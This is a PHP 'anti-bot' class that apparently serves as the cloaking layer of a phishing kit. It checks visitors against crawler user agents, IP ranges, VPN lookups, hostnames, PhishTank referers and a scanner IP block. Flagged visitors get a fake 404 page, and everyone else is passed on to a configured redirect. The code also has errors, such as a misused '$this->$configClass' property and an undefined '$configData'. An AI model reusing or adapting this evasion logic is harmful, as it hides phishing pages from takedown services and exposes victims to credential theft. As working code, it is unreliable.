<?php

include_once(__DIR__ . "/config.php");

class AntiBotPDTeam
{

    private $configClass;

    public function __construct() {
        $config = new AntiBotConfig();
        $configData = $config->getConfigData();
        $this->$configClass = $configData;
        $this->processUser();
    }

    public function readJsonFile($file) {
        return json_decode(file_get_contents(__DIR__. "/json/" . $file), true);
    }

    public function getUserAgent() {
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        return $userAgent;
    }

    public function getIPv4Address() {
        if (!empty($_SERVER['HTTP_CLIENT_IP']) && filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
          return $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
          $ipAddresses = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
          foreach ($ipAddresses as $ip) {
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
              return $ip;
            }
          }
        }
      
        return $_SERVER['REMOTE_ADDR'];
    }

    public function getIPv6Address() {
        if (!empty($_SERVER['HTTP_CLIENT_IP']) && filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
          return $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
          $ipAddresses = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
          foreach ($ipAddresses as $ip) {
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
              return $ip;
            }
          }
        }
      
        return $_SERVER['REMOTE_ADDR'];
    }      

    public function getHostAddress() {
        return gethostbyaddr($_SERVER['REMOTE_ADDR']);
    }
      

    public function checkBotUserAgentPattern() {
        $data = $this->readJsonFile("crawler-user-agents.json");
        $userAgentToCheck = $this->getUserAgent();

        foreach ($data as $ua) {
            if (fnmatch($ua, $userAgentToCheck)) {
              return true;
            }
          }
          return false;
    }

    public function checkIPv4Range() {
        $ipRanges = $this->readJsonFile("ipv4-ranges.json");
        $ip = $this->getIPv4Address();

        $ipLong = ip2long($ip);
        if ($ipLong === false) {
          throw new Exception('Incorrect IP address');
        }
      
        foreach ($ipRanges as $range) {
          list($subnet, $mask) = explode('/', $range);
          $subnetLong = ip2long($subnet);
          $maskLong = ~((1 << (32 - $mask)) - 1);
      
          if (($ipLong & $maskLong) === ($subnetLong & $maskLong)) {
            return true;
          }
        }
        return false;
    }

    public function checkIPv6Range() {
        $ipRanges = $this->readJsonFile("ipv6-ranges.json");
        $ip = $this->getIPv6Address();

        $ipLong = inet_pton($ip);
        if ($ipLong === false) {
          throw new Exception('Incorrect IP address');
        }
      
        foreach ($ipRanges as $range) {
          list($subnet, $mask) = explode('/', $range);
          $subnetLong = inet_pton($subnet);
          $binMask = str_repeat('f', $mask >> 2);
          $binMask .= ['0', '8', 'c', 'e', 'f'][$mask & 3];
          $binMask = str_pad($binMask, 32, '0');
      
          if (($ipLong & $binMask) === ($subnetLong & $binMask)) {
            return true;
          }
        }
        return false;
    }

    public function checkProxyVpn() {
        $ipAddress = $this->getIPv4Address();

        $apiUrl = 'https://blackbox.ipinfo.app/lookup/' . $ipAddress;
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $apiUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        curl_close($ch);

        if (!empty($response) && $response === "Y") {
            return true;
        }

        return false;
    }

    public function checkHostAddress() {
        $hostAddresses = $this->readJsonFile("crawler-hosts.json");
        $userHost = $this->getHostAddress();
        foreach ($hostAddresses as $address) {
            if (strcasecmp($userHost, $address) === 0) {
                return true;
            }
        }
         
        return false;
    }

    public function checkPhishTank() {
        $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : null;
        $remoteIP = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : null;
        $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : null;
      
        if ($referer) {
          $refererHost = parse_url($referer, PHP_URL_HOST);
          if ($refererHost === 'phishtank.com' || $refererHost === 'www.phishtank.com') {
            return true;
          }
        }
      
        $rangeStart = ip2long("146.112.0.0");
        $rangeEnd = ip2long("146.112.255.255");
        $ipLong = ip2long($remoteIP);
      
        if ($ipLong >= $rangeStart && $ipLong <= $rangeEnd) {
            return true;
        }

        return false;
    }

    public function checkBrowser() {
        $data = $this->readJsonFile("crawler-browsers.json");
        $userAgent = $this->getUserAgent();

        foreach($data as $bot) {
            if (stripos($userAgent, $bot) !== false) {
                return true;
            }
        }

        return false;
    }

    public function validateGetParameter() {
        $getParameters = $this->$configData['getParameter'];

        if (empty($_GET)) {
            return false;
        }

        foreach ($getParameters as $paramName => $expectedValues) {
            if (isset($_GET[$paramName])) {
                if (in_array($_GET[$paramName], $expectedValues)) {
                    return true;
                }
            }
        }
    
        return false;
    }
  
    public function validateUser() {
        if ($this->$configClass["checkBotUserAgentPattern"] && $this->checkBotUserAgentPattern()) {
            $this->writeToLogFile("checkBotUserAgentPattern");
            return false;
        }
        if ($this->$configClass["checkIPv4Range"] && $this->checkIPv4Range()) {
            $this->writeToLogFile("checkIPv4Range");
            return false;
        }
        if ($this->$configClass["checkIPv6Range"] && $this->checkIPv6Range()) {
            $this->writeToLogFile("checkIPv6Range");
            return false;
        }
        if ($this->$configClass["checkProxyVpn"] && $this->checkProxyVpn()) {
            $this->writeToLogFile("checkProxyVpn");
            return false;
        }
        if ($this->$configClass["checkHostAddress"] && $this->checkHostAddress()) {
            $this->writeToLogFile("checkHostAddress");
            return false;
        }
        if ($this->$configClass["checkPhishTank"] && $this->checkPhishTank()) {
            $this->writeToLogFile("checkPhishTank");
            return false;
        }
        if ($this->$configClass["checkBrowser"] && $this->checkBrowser()) {
            $this->writeToLogFile("checkBrowser");
            return false;
        }
        if ($this->$configClass["checkGet"] && !$this->validateGetParameter()) {
            $this->writeToLogFile("checkGet");
            return false;
        }
        
        return true;
    }

    public function processUser() {

        if($_SESSION['realUser']) {
          return;
        }

        $result = $this->validateUser();

        if ($result) {
          $_SESSION['realUser'] = true;
        } else {
          $this->displayNotFoundError();
        }

    }

    public function checkedRedirect() {
        $queryString = http_build_query($_GET);
        $redirectUrl = $this->$configClass["redirectUrl"] . '?' . $queryString;
        header('Location: ' . $redirectUrl);
        exit();
    }

    public function displayNotFoundError() {
        http_response_code(404); 

        echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
        <html>
        <head>
          <title>404 Not Found</title>
        </head>
        <body>
          <h1>Not Found</h1>
          <p>The requested URL was not found on this server.</p>
        </body>
        </html>
        ';

      exit();

    }

    public function getTimeAndDate() {
        return date("Y-m-d H:i:s");
    }

    public function writeToLogFile($reason) {
        $filename =  __DIR__ . '/logs/bots.txt';
        $content = $this->collectLog($reason);

        file_put_contents($filename, $content, FILE_APPEND | LOCK_EX);
    }

    public function collectLog($reason) {
        $ipv4 = $this->getIPv4Address();
        $ipv6 = $this->getIPv6Address();
        $userAgent = $this->getUserAgent();
        $hostAddress = $this->getHostAddress();
        $date = $this->getTimeAndDate();
        
        $log = $ipv4 . "|" . $ipv6 . "|" . $userAgent . "|" . $hostAddress . "|" . $reason . "|" . $date . PHP_EOL;

        return $log;
    }

}